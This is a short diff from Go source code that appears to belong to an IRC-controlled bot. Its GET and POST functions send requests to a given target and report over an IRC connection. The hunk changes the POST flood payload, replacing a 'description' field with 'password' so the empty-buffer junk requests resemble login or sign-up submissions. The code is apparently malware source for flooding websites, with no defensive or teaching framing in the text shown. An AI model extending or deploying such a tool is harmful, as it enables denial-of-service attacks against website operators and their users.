@@ -43,10 +43,10 @@ func GET(getTarget, set_chan string, reportIRC net.Conn) {
 func POST(postTarget, set_chan string, reportIRC net.Conn) {
 	buffer := make([]byte, 25)
 	reqBody, _ := json.Marshal(map[string]string{
-		"name":        string(buffer),
-		"description": string(buffer),
-		"type":        string(buffer),
-		"e-mail":      string(buffer),
+		"e-mail":   string(buffer),
+		"password": string(buffer),
+		"name":     string(buffer),
+		"type":     string(buffer),
 	})
 	post_request, err := http.NewRequest("POST", postTarget+"/"+string(reqBody), nil)
 	if err != nil {
